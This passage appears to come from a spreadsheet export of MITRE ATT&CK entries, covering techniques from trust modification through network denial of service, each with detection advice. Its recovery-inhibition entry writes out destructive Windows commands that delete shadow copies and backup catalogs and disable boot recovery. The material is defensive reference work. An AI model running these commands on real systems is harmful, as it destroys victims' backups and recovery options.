GPO abuse will often be accompanied by some other behavior such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704).</t>
  </si>
  <si>
    <t>T1484.002</t>
  </si>
  <si>
    <t>Trust Modification (T1484.002)</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Modification, Application Log: Application Log Content, Command: Command Execution</t>
  </si>
  <si>
    <t>Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.
Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) 
An adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)</t>
  </si>
  <si>
    <t>Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes &lt;code&gt;Set federation settings on domain&lt;/code&gt; and &lt;code&gt;Set domain authentication&lt;/code&gt;.(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods) This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details.(Citation: Sygnia Golden SAML)(Citation: CISA SolarWinds Cloud Detection)
Monitor for PowerShell commands such as: &lt;code&gt;Update-MSOLFederatedDomain –DomainName: "Federated Domain Name"&lt;/code&gt;, or &lt;code&gt;Update-MSOLFederatedDomain –DomainName: "Federated Domain Name" –supportmultipledomain&lt;/code&gt;.(Citation: Microsoft - Update or Repair Federated domain)</t>
  </si>
  <si>
    <t>T1485</t>
  </si>
  <si>
    <t>Cloud Storage: Cloud Storage Deletion, Cloud Storage: Cloud Storage Modification, Command: Command Execution, File: File Deletion, File: File Modification, Image: Image Deletion, Instance: Instance Deletion, Process: Process Creation, Snapshot: Snapshot Deletion, Volume: Volume Deletion</t>
  </si>
  <si>
    <t>Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as &lt;code&gt;del&lt;/code&gt; and &lt;code&gt;rm&lt;/code&gt; often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.
Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)
To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional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2017)(Citation: Talos Olympic Destroyer 2018).
In cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and command-line parameters of binaries that could be involved in data destruction activity, such as [SDelete](https://attack.mitre.org/software/S0195). Monitor for the creation of suspicious files as well as high unusual file modification activity. In particular, look for large quantities of file modifications in user directories and under &lt;code&gt;C:\Windows\System32\&lt;/code&gt;.
In cloud environments, the occurrence of anomalous high-volume deletion events, such as the &lt;code&gt;DeleteDBCluster&lt;/code&gt; and &lt;code&gt;DeleteGlobalCluster&lt;/code&gt; events in AWS, or a high quantity of data deletion events, such as &lt;code&gt;DeleteBucket&lt;/code&gt;, within a short period of time may indicate suspicious activity.</t>
  </si>
  <si>
    <t>T1485.001</t>
  </si>
  <si>
    <t>Lifecycle-Triggered Deletion (T1485.001)</t>
  </si>
  <si>
    <t>Cloud Storage: Cloud Storage Modification</t>
  </si>
  <si>
    <t>Adversaries may modify the lifecycle policies of a cloud storage bucket to destroy all objects stored within.  
Cloud storage buckets often allow users to set lifecycle policies to automate the migration, archival, or deletion of objects after a set period of time.(Citation: AWS Storage Lifecycles)(Citation: GCP Storage Lifecycles)(Citation: Azure Storage Lifecycles) If a threat actor has sufficient permissions to modify these policies, they may be able to delete all objects at once. 
For example, in AWS environments, an adversary with the `PutLifecycleConfiguration` permission may use the `PutBucketLifecycle` API call to apply a lifecycle policy to an S3 bucket that deletes all objects in the bucket after one day.(Citation: Palo Alto Cloud Ransomware) In addition to destroying data for purposes of extortion and [Financial Theft](https://attack.mitre.org/techniques/T1657), adversaries may also perform this action on buckets storing cloud logs for [Indicator Removal](https://attack.mitre.org/techniques/T1070).(Citation: Datadog S3 Lifecycle CloudTrail Logs)</t>
  </si>
  <si>
    <t>T1486</t>
  </si>
  <si>
    <t>Cloud Storage: Cloud Storage Modification, Command: Command Execution, File: File Creation, File: File Modification, Network Share: Network Share Access, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)
In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) 
To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as "print bombing").(Citation: NHS Digital Egregor Nov 2020)
In cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.
In some cases, monitoring for unusual kernel driver installation activity can aid in detection.
In cloud environments, monitor for events that indicate storage objects have been anomalously replaced by copies.</t>
  </si>
  <si>
    <t>T1489</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Process: OS API Execution, Process: Process Creation, Process: Process Termination, Service: Service Metadata, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) 
Adversaries may accomplish this by disabling individual services of high importance to an organization, such as &lt;code&gt;MSExchangeIS&lt;/code&gt;, which will make Exchange content inaccessible.(Citation: Novetta Blockbuster) In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments to see if critical processes are terminated or stop running.
Monitor for edits for modifications to services and startup programs that correspond to services of high importance. Look for changes to services that do not correlate with known software, patch cycles, etc. Windows service information is stored in the Registry at &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Services&lt;/code&gt;. Systemd service unit files are stored within the /etc/systemd/system, /usr/lib/systemd/system/, and /home/.config/systemd/user/ directories, as well as associated symbolic links.
Alterations to the service binary path or the service startup type changed to disabled may be suspicious.
Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, &lt;code&gt;ChangeServiceConfigW&lt;/code&gt; may be used by an adversary to prevent services from starting.(Citation: Talos Olympic Destroyer 2018)</t>
  </si>
  <si>
    <t>T1490</t>
  </si>
  <si>
    <t>Cloud Storage: Cloud Storage Deletion, Command: Command Execution, File: File Deletion, Process: Process Creation, Service: Service Metadata, Snapshot: Snapshot Deletion, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.
Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)
A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:
* &lt;code&gt;vssadmin.exe&lt;/code&gt; can be used to delete all volume shadow copies on a system - &lt;code&gt;vssadmin.exe delete shadows /all /quiet&lt;/code&gt;
* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - &lt;code&gt;wmic shadowcopy delete&lt;/code&gt;
* &lt;code&gt;wbadmin.exe&lt;/code&gt; can be used to delete the Windows Backup Catalog - &lt;code&gt;wbadmin.exe delete catalog -quiet&lt;/code&gt;
* &lt;code&gt;bcdedit.exe&lt;/code&gt; can be used to disable automatic Windows recovery features by modifying boot configuration data - &lt;code&gt;bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {default} recoveryenabled no&lt;/code&gt;
* &lt;code&gt;REAgentC.exe&lt;/code&gt; can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system
* &lt;code&gt;diskshadow.exe&lt;/code&gt; can be used to delete all volume shadow copies on a system - &lt;code&gt;diskshadow delete shadows all&lt;/code&gt; (Citation: Diskshadow) (Citation: Crytox Ransomware)
On network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.
Adversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, bcdedit, REAgentC, and diskshadow. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.
Monitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of &lt;code&gt;HKEY_CURRENT_USER\Software\Policies\Microsoft\PreviousVersions\DisableLocalPage&lt;/code&gt;).
For network infrastructure devices, collect AAA logging to monitor for `erase`, `format`, and `reload` commands being run in succession.</t>
  </si>
  <si>
    <t>T1491</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. 
</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor internal and external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.
</t>
  </si>
  <si>
    <t>T1491.001</t>
  </si>
  <si>
    <t>Internal Defacement (T1491.001)</t>
  </si>
  <si>
    <t>An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)</t>
  </si>
  <si>
    <t>Monitor internal and websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.</t>
  </si>
  <si>
    <t>T1491.002</t>
  </si>
  <si>
    <t>External Defacement (T1491.002)</t>
  </si>
  <si>
    <t>An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)</t>
  </si>
  <si>
    <t>Monitor external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.</t>
  </si>
  <si>
    <t>T1495</t>
  </si>
  <si>
    <t>Firmware: Firmware Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.
In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485). </t>
  </si>
  <si>
    <t>System firmware manipulation may be detected.(Citation: MITRE Trustworthy Firmware Measurement) Log attempts to read/write to BIOS and compare against known patching behavior.</t>
  </si>
  <si>
    <t>T1496</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Cloud Service: Cloud Service Modification, Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation, Sensor Health: Host Status</t>
  </si>
  <si>
    <t>Containers, IaaS, Linux, SaaS, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. 
Resource hijacking may take a number of different forms. For example, adversaries may:
* Leverage compute resources in order to mine cryptocurrency
* Sell network bandwidth to proxy networks
* Generate SMS traffic for profit
* Abuse cloud-based messaging services to send large quantities of spam messages
In some cases, adversaries may leverage multiple types of Resource Hijacking at once.(Citation: Sysdig Cryptojacking Proxyjacking 2023)</t>
  </si>
  <si>
    <t>Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources. Monitor for suspicious use of network resources associated with cryptocurrency mining software. Monitor for common cryptomining software process names and files on local systems that may indicate compromise and resource usage.</t>
  </si>
  <si>
    <t>T1496.001</t>
  </si>
  <si>
    <t>Compute Hijacking (T1496.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation, Sensor Health: Host Status</t>
  </si>
  <si>
    <t>Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. 
One common purpose for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)
Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.(Citation: Trend Micro War of Crypto Miners)</t>
  </si>
  <si>
    <t>T1496.002</t>
  </si>
  <si>
    <t>Bandwidth Hijacking (T1496.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may leverage the network bandwidth resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. 
Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR) Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.(Citation: Sysdig Proxyjacking) Finally, they may engage in internet-wide scanning in order to identify additional targets for compromise.(Citation: Unit 42 Leaked Environment Variables 2024)
In addition to incurring potential financial costs or availability disruptions, this technique may cause reputational damage if a victim’s bandwidth is used for illegal activities.(Citation: Sysdig Proxyjacking)</t>
  </si>
  <si>
    <t>T1496.003</t>
  </si>
  <si>
    <t>SMS Pumping (T1496.003)</t>
  </si>
  <si>
    <t>Adversaries may leverage messaging services for SMS pumping, which may impact system and/or hosted service availability.(Citation: Twilio SMS Pumping) SMS pumping is a type of telecommunications fraud whereby a threat actor first obtains a set of phone numbers from a telecommunications provider, then leverages a victim’s messaging infrastructure to send large amounts of SMS messages to numbers in that set. By generating SMS traffic to their phone number set, a threat actor may earn payments from the telecommunications provider.(Citation: Twilio SMS Pumping Fraud)
Threat actors often use publicly available web forms, such as one-time password (OTP) or account verification fields, in order to generate SMS traffic. These fields may leverage services such as Twilio, AWS SNS, and Amazon Cognito in the background.(Citation: Twilio SMS Pumping)(Citation: AWS RE:Inforce Threat Detection 2024) In response to the large quantity of requests, SMS costs may increase and communication channels may become overwhelmed.(Citation: Twilio SMS Pumping)</t>
  </si>
  <si>
    <t>T1496.004</t>
  </si>
  <si>
    <t>Cloud Service Hijacking (T1496.004)</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Cloud Service: Cloud Service Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may leverage compromised software-as-a-service (SaaS) applications to complete resource-intensive tasks, which may impact hosted service availability. 
For example, adversaries may leverage email and messaging services, such as AWS Simple Email Service (SES), AWS Simple Notification Service (SNS), SendGrid, and Twilio, in order to send large quantities of spam / [Phishing](https://attack.mitre.org/techniques/T1566) emails and SMS messages.(Citation: Invictus IR DangerDev 2024)(Citation: Permiso SES Abuse 2023)(Citation: SentinelLabs SNS Sender 2024) Alternatively, they may engage in LLMJacking by leveraging reverse proxies to hijack the power of cloud-hosted AI models.(Citation: Sysdig LLMJacking 2024)(Citation: Lacework LLMJacking 2024)
In some cases, adversaries may leverage services that the victim is already using. In others, particularly when the service is part of a larger cloud platform, they may first enable the service.(Citation: Sysdig LLMJacking 2024) Leveraging SaaS applications may cause the victim to incur significant financial costs, use up service quotas, and otherwise impact availability. </t>
  </si>
  <si>
    <t>T1497</t>
  </si>
  <si>
    <t>Defense Evasion, Discovery</t>
  </si>
  <si>
    <t xml:space="preserve">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use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)
</t>
  </si>
  <si>
    <t>Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.</t>
  </si>
  <si>
    <t>T1497.001</t>
  </si>
  <si>
    <t>System Checks (T1497.001)</t>
  </si>
  <si>
    <t>Adversaries may employ various system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Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. 
Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.
Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. 
Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)</t>
  </si>
  <si>
    <t>Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.</t>
  </si>
  <si>
    <t>T1497.002</t>
  </si>
  <si>
    <t>User Activity Based Checks (T1497.002)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may employ various user activity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search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) </t>
  </si>
  <si>
    <t xml:space="preserve">User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. </t>
  </si>
  <si>
    <t>T1497.003</t>
  </si>
  <si>
    <t>Time Based Evasion (T1497.003)</t>
  </si>
  <si>
    <t>Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.
Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)
Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)
Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)</t>
  </si>
  <si>
    <t xml:space="preserve">Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. </t>
  </si>
  <si>
    <t>T1498</t>
  </si>
  <si>
    <t>Network Traffic: Network Traffic Flow, Sensor Health: Host Status</t>
  </si>
  <si>
    <t>Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)
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as a distributed DoS (DDoS).
To perform Network DoS attacks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For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).</t>
  </si>
  <si>
    <t>Detection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an Network DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.</t>
  </si>
  <si>
    <t>T1498.001</t>
  </si>
  <si>
    <t>Direct Network Flood (T1498.001)</t>
  </si>
  <si>
    <t>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protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.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t>
  </si>
  <si>
